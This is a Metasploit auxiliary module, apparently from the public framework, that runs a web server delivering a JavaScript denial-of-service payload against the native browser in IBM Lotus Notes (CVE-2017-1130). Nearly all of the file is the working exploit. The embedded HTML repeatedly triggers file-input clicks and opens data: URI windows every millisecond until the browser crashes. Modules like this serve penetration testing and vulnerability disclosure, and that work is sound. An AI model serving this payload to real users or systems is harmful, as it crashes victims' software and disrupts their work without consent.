##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "IBM Notes Denial Of Service",
        'Description'    => %q(
          This module exploits a vulnerability in the native browser that comes with IBM Lotus Notes.
          If successful, the browser will crash after viewing the webpage.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Dhiraj Mishra',
        ],
        'References'     => [
          ['EDB', '42604'],
          [ 'CVE', '2017-1130' ]
        ],
        'DisclosureDate' => 'Aug 31 2017',
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = %|
<html><body>
<input type="file" id="f">
<script>
var w;
var kins = {};
var i = 1;
f.click();
setInterval("f.click()", 1);
setInterval(function(){
          for (var k in kins) {
          if (kins[k] && kins[k].status === undefined) {
          kins[k].close();
          delete kins[k];
           }
         }
        w = open('data:text/html,<input type="file" id="f"><script>f.click();setInterval("f.click()", 1);<\\/script>');
        if (w) {
                kins[i] = w;
                i++;
        }
}, 1);
</script>
</body></html>
    |
  end

  def on_request_uri(cli, _request)
    print_status('Sending response')
    send_response(cli, @html)
  end
end
